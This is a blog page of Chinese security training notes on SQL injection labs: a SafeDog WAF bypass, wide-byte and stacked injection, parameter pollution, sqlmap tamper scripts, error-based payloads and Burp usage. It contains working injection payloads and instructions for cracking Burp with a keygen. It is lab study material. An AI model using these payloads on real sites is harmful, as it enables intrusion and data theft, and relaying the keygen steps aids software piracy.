<!DOCTYPE html>
<html lang="en">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Tangxianshen" />


    
    


<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Tangxianshen">
<meta name="twitter:card" content="summary">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">



    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Hexo</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: false
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






<meta name="generator" content="Hexo 6.3.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/R-C.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>Menu</li>
                        <li>Tags</li>
                        
                        <li>Friends</li>
                        
                        
                        <li>About Me</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于前端</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/R-C.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
</nav>
      <div class="body-wrap">
  
    <article id="post-培训笔记24" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/01/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B024/" class="article-date">
      <time datetime="2024-01-01T14:07:33.000Z" itemprop="datePublished">2024-01-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/01/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B024/">安全狗的安装，WAF绕过，SQL注入Oracle数据库，Burp的安装与使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="安全狗的安装"><a href="#安全狗的安装" class="headerlink" title="安全狗的安装"></a>安全狗的安装</h2><p>1.在虚拟机win10浏览器的安全狗官网，链接：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn/</a>     在首页的免费安全产品下载网站安全狗。下载后先不要安装。<br>2.关闭小皮的Apache，加入一个新的Apache到系统服务中，管理员权限打开<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dos%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">dos命令</a>面板，进入phpstudy_pro\Extensions\Apache2.4.39\bin文件夹，输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703923927662-0a71ce58-3788-4976-9b87-bfb04d28c63d.png" alt="image.png"><br>3.安装完成后打开系统服务列表查看是否安装成功。win+r ，services.msc。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703924194205-137e4869-69af-4c52-8ac7-40f316fe14fa.png" alt="image.png"><br>4.安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义<br>5.用管理员权限启动安全狗。</p>
<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>1.WAF（Web应用防火墙）是一种安全解决方案，旨在保护Web应用程序免受各种攻击，如SQL注入、跨站脚本（XSS）和命令执行等。然而，由于WAF通常基于正则表达式和预定义的规则集来检测攻击，因此存在被绕过的可能性。<br>2.WAF绕过方法总结，链接:<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15072903/4074643">WAF绕过方法总结_51CTO博客_如何绕过waf</a><br>3.安装了安全狗后，以sqli的第1关为例<br>输入<code>?id=1&#39; union select</code>,被安全狗的过滤规则检测到了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703926489604-9c1db1db-d658-419e-8c86-4769d0d96022.png" alt="image.png"><br>4.打开Yakit软件，把第一关链接192.168.2.2&#x2F;sqli&#x2F;Less&#x2F;?id&#x3D;1复制到Yakit内置浏览器，然后抓包。<br>5.点击Fuzz，然后在下图位置插入字典。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703927865832-e7d97cc8-d142-480e-ae9c-58453e4c949b.png" alt="image.png"><br>6.字典中添加如下内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091196967-1b6ad3ce-fc70-4816-95a7-914469d17e7b.png" alt="image.png"><br>7.点击发送请求，1,2行数据报错，原因是字典中的空格没有编码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091317501-59a742e3-933d-4fa4-b207-6adf649c2352.png" alt="image.png"><br>8.给空格编码%20后，1，2行数据没有报错了。响应大小为5276说明被安全狗拦截了。4~8整个过程被称为模糊测试。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091836408-6b5ba193-d829-452b-84ac-3a819cbbe172.png" alt="image.png"></p>
<p>9.在12345处插入6位验证码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092850626-f66efa29-7940-4091-a927-1207860dfe92.png" alt="image.png"><br>10.得到我们需要的payloads<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704093298003-42fd35f4-ff58-4816-aab3-b0d09e84435b.png" alt="image.png"><br>11.把之前的12345换成00044<br>12.输入以下代码：<br><code>?id=0&#39;union/*//*//*!00044select*/1,/*//*/!00044database*//*//*//*!00044()*/,3-- -</code><br>结果成功绕过安全狗：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704093728644-e0d33e6f-b6a1-4357-a42d-a38e18f24af2.png" alt="image.png"></p>
<h2 id="SQL注入Oracle数据库"><a href="#SQL注入Oracle数据库" class="headerlink" title="SQL注入Oracle数据库"></a>SQL注入Oracle数据库</h2><p>1.访问靶场网站，链接：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a>    注册并登录<br>2.第一关，右键翻译网页，溶液代表答案，然后访问实验室。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704096500832-6383d77a-1822-484a-bc9c-a0537242ffae.png#averageHue=%23fbf8f6&clientId=ud97d2098-215c-4&from=paste&height=877&id=uf96c988a&originHeight=877&originWidth=1129&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131118&status=done&style=none&taskId=ua9172af0-2cf5-4be1-b2d3-40b6ec41f22&title=&width=1129" alt="image.png"><br>3.在地址栏输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter?category=%27+OR+1=1--</span><br></pre></td></tr></table></figure>

<p>成功注入，结果如下:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097664693-eaf05e4f-57b5-4ea4-8520-ef490c5c8679.png" alt="image.png"></p>
<p>3.第二关，是SQL注入登录框  username填administrator’–，密码是随机的，填1<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098378506-87a87d3b-cbe1-4c77-b406-c39f80a7f377.png" alt="image.png"></p>
<p>成功注入，结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704098169171-41e3c47d-77a8-4780-bbef-7d4fabf0ef8b.png" alt="image.png"></p>
<h2 id="Burp的安装与使用"><a href="#Burp的安装与使用" class="headerlink" title="Burp的安装与使用"></a>Burp的安装与使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.下载并安装Burp抓包软件（半汉化版），官网链接：<a target="_blank" rel="noopener" href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>2.cmd打开这个路径<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099517933-ca05e238-4f50-46e5-a61c-672dfb2bf9cf.png" alt="image.png"><br>3.在命令窗口输入<code>Java -vision</code>确认java版本是java19<br>再输入<code>java -jar burp-loader-keygen-2_1_06.jar</code>然后会弹出下面的窗口<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099918098-4560d7e0-6f8d-4082-ab16-dbeaa56809ea.png" alt="image.png"><br>4.然后再双击汉化启动。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099987988-6c2f6504-bbc1-4feb-b1fb-55c2d69c3f8c.png" alt="image.png"><br>5.把左边的License复制到右边，点击下一步&#x3D;&gt;手动激活。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100090794-9822c05b-cac7-4b5c-ae09-8efafe815648.png" alt="image.png"><br>6.过程1：把右边内容复制到左边<br> 过程2：把左边下方内容复制到右边下方<br>点击下一个，激活成功<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100270809-953b141b-b872-4df5-adcb-93610018d4ab.png" alt="image.png"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>1.sqli第一关，用Burp抓包。依次点击Proxy–&gt;intercept–&gt;打开内置浏览器–&gt;复制第一关的链接粘贴到内置浏览器–&gt;HTTP history–&gt;对应的数据包<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100894006-a526597e-2688-40b2-a763-995a0f90cb74.png" alt="image.png"><br>2.用Burp爆破。右击数据包–&gt;发送到repeat<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101529865-2dc05e81-8d1b-42df-98bc-96ce3ee02698.png" alt="image.png" style="zoom:80%;" />3.    1-50迭代。右击数据包–&gt;发送到intruder     （intruder是爆破器 ）选择1–&gt;添加<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101973577-46b49ac2-6ccc-4b8a-a5d4-96c488729f8d.png" alt="image.png"><br>4.点击Payloads–&gt;Payloads  type选择Numbers–&gt;1  50  1–&gt;点击发送<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102160879-12f3da70-3151-418b-b89b-913f8d34bcf4.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记23" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/01/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B023/" class="article-date">
      <time datetime="2024-01-01T13:49:35.000Z" itemprop="datePublished">2024-01-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/01/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B023/">宽字节注入，堆叠注入，绕过 ,Tamper脚本</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="宽字节注入-—-df"><a href="#宽字节注入-—-df" class="headerlink" title="宽字节注入 —%df"></a>宽字节注入 —%df</h2><p>1.涉及函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addslashes()   /函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string() /函数转义 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line"></span><br><span class="line">mysql_escape_string() /转义一个字符串</span><br></pre></td></tr></table></figure>

<p>2.原理<br>先了解一下什么是窄、宽字节已经常见宽字节编码：</p>
<ul>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</li>
</ul>
<p>3.逃逸过程：<br>     and被php转义后就是%df<br> （1）举例命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; and 1=1--+</span><br></pre></td></tr></table></figure>

<p>%df’&#x3D;&gt;%df&#39;（单引号会被加上转义字符\）<br>%df&#39;&#x3D;&gt;%df%5c’（\的十六进制为%5c）<br>%df%5c’&#x3D;&gt;縗’（GBK编码时会认为这时一个宽字节）<br>‘成功逃逸，sql语法正确<br>3.例题<br>sql-labs-32关<br>（1）先找闭合点，输入?id&#x3D;1’,页面显示1的后面多了 \   z在输入id&#x3D;1”     id&#x3D;’1’  ,发现单引号后面都有 \    猜测 \ 把单引号转义了，考虑用宽字节注入%df<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703765765377-ca80fe14-011d-47c7-b5a5-6e51dcd1861b.png" alt="image.png"><br>（2）输入id&#x3D;1%df’后报错，单引号是闭合点。具体代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.2/sqli/Less-32/?id=1%df&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -</span><br></pre></td></tr></table></figure>

<p>结果：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703766052527-d2b5c623-8923-4f0c-9a0f-9d7af0a80391.png" alt="image.png"></p>
<p>4.锟斤拷：锟斤拷通常指的是在网络或计算机系统中出现的一串特殊乱码字符，这种现象多出现在字符编码转换过程中。具体来说，锟斤拷出现的原因是因为在将某些字符从GBK编码转换为Unicode编码时，存在一些字符是Unicode无法表示的。为了在Unicode中有一个地方表示这些字符，Unicode官方定义了一个特殊的占位符，即U+FFFD REPLACEMENT CHARACTER。<br>在UTF-8编码中，这个占位符被编码为EFBFBD。当这些编码被错误地识别为GBK编码时，由于GBK是一个双字节编码，它会把EFBFBD这样的字节序列错误地解释为一个汉字，于是产生了像“锟斤拷”这样的乱码。其中，“锟”对应于EFBF，“斤”对应于BDEF，“拷”对应于BFBD。</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>1.堆叠注入的含义<br>从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。<br><strong>注意不是每个数据库环境都可以支持堆叠注入。</strong><br>2.MySQL多语句执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select *from user;select * from emails</span><br><span class="line">select 1,(select group_concat(1,2,3)),3</span><br><span class="line">select 1,2,3 union select 4,5,6</span><br></pre></td></tr></table></figure>

<p>3.例题<br>sql-labs-38关<br>源代码中有mysqli_multi_query  可以用堆叠注入<br>?id&#x3D;-1’;insert into users(id,username,password) values (‘17’,’Jay’,666’)– +<br>输入id&#x3D;17的结果：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703770397512-de8edcb3-dfa9-4a4a-8f38-6ce58838eefd.png" alt="image.png"></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><p>1.同一个参数发出两个值，不同的浏览器会接收不同的参数，参数可能是第一个或者第三个，不可能是中间的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?p=usa&amp;p=china</span><br><span class="line">百度1</span><br><span class="line">雅虎2</span><br><span class="line">google 1+2</span><br><span class="line">php/apache 2</span><br><span class="line">flask 1</span><br><span class="line">jsp/tomcat 1</span><br><span class="line">CGI/apache 1</span><br><span class="line">python/apache 1+2</span><br><span class="line">asp/iis </span><br></pre></td></tr></table></figure>

<p>2.例如，在CSDN找一个下载sql server的外链接：<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https%3A%2F%2Fwww.microsoft.com%2Fzh-cn%2Fsql-server%2Fsql-server-downloads</a><br>将其复制到Yakit软件用URL解码，解码为<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703772452472-307f1e1e-3296-4a2c-a48a-ca3b4c2c2bf5.png" alt="image.png"></p>
<ol start="3">
<li>在<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a> 后加一个参数target&#x3D;，即<a href="https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://link.csdn.net/?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>?target&#x3D;<a target="_blank" rel="noopener" href="https://tb.alicdn.com/snapshot/index.html">https://tb.alicdn.com/snapshot/index.html</a>   ，为了方便理解，我们把两个target的内容换一下位置，即：<a href="https://tb.alicdn.com/snapshot/index.html?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://tb.alicdn.com/snapshot/index.html?target=https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a>因为CSDN是用java写的，当点击这个网址时，根据    jsp&#x2F;tomcat 1   会跳到第一个参数。如下图，从CSDN跳到了淘宝。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703773886798-9941ff79-59ab-4084-bbc9-3a4c10d20bf7.png" alt="image.png"></li>
</ol>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703773921659-cc02d845-4a59-4a1f-98aa-ad996f44354a.png" alt="image.png"></p>
<h3 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h3><p>   详细SQL注入绕过技术见链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1849607">https://cloud.tencent.com/developer/article/1849607</a></p>
<h2 id="Sqlmap的Tamper脚本"><a href="#Sqlmap的Tamper脚本" class="headerlink" title="Sqlmap的Tamper脚本"></a>Sqlmap的Tamper脚本</h2><h3 id="1-Tamper脚本的介绍："><a href="#1-Tamper脚本的介绍：" class="headerlink" title="1.Tamper脚本的介绍："></a>1.Tamper脚本的介绍：</h3><p>它允许用户在执行SQL注入攻击时对 payload（攻击载荷）进行修改，以绕过目标服务器的防护机制，如WAF（Web Application Firewall）或IDS（Intrusion Detection System）。这些防护系统通常会检测和过滤掉某些特定的关键字或模式，以防止恶意攻击。Tamper脚本对payload进行转换或编码，使其能够逃避这些检测。</p>
<h3 id="2-Sqlmap常用命令（面试考）"><a href="#2-Sqlmap常用命令（面试考）" class="headerlink" title="2.Sqlmap常用命令（面试考）"></a>2.Sqlmap常用命令（面试考）</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703774560959-2550790a-2d02-4e02-b7da-de1dbb8ee384.png" alt="Image.png"></p>
<h3 id="3-Sqlmap跑sqli-labs-26a关"><a href="#3-Sqlmap跑sqli-labs-26a关" class="headerlink" title="3.Sqlmap跑sqli-labs 26a关"></a>3.Sqlmap跑sqli-labs 26a关</h3><p>在vscode中新建1.py  并在它中编写26a关的Tamper脚本，将其复制到kali机的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;  的目录下。在kali的命令窗口运行以下命令;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.2/sqli/Less-26a/?id=1&quot; -p id --dbms=MySQL --tamper=&quot;1.py&quot; --dbs --batch</span><br></pre></td></tr></table></figure>

<p>成功爆出数据库<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703775172152-497ec8a3-68f9-4164-b79c-473774736168.png" alt="Image.png"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记21" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/" class="article-date">
      <time datetime="2023-12-25T02:13:04.000Z" itemprop="datePublished">2023-12-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/">SQL注入之盲注型,报错型，postman软件的使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="SQL数字型注入"><a href="#SQL数字型注入" class="headerlink" title="SQL数字型注入"></a>SQL数字型注入</h2><p>1.打开虚拟机win10hei的phpstudy,开启Apache和Mysql，使用php5.5.9,打开网站，点击sqli,点击下图圈内的数据，初始化数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163695294-5a64ff5b-77a0-4b29-8675-4a840803c65b.png" alt="image.png"><br>2.进入第二关，按键盘的F12,点击HackBar,输入<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-2/?id=1">http://192.168.17.128/sqli/Less-2/?id=1</a>，没报错，我们要找的是报错点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163939662-a60b000d-b674-43cd-b548-dce59af2a3b4.png" alt="image.png"><br>3.查看第二关的代码，发现这关的解法是数字型注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164370988-148029f7-d7ef-4e36-9e3c-6157fb4e515e.png" alt="image.png"><br>4.id&#x3D;1 后面加 order by 4,发现字段没有四列，所以一般是3列。开始查表。和之前的一样的套路，union联合注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164620139-6071a896-7eac-4fef-966e-6a004057d5a6.png" alt="image.png"><br>5.查字段名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164753618-29682902-5766-431f-9374-9cc5c40f5cdd.png" alt="image.png"><br>6.查字段，得到我们想要的结果<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164848325-261c35f6-89c1-4224-a04a-35ece6a05ef5.png" alt="image.png"><br>7.十种常见的SQL报错函数  （注意：函数前用and连接）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))-- -</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))-- -</span><br></pre></td></tr></table></figure>

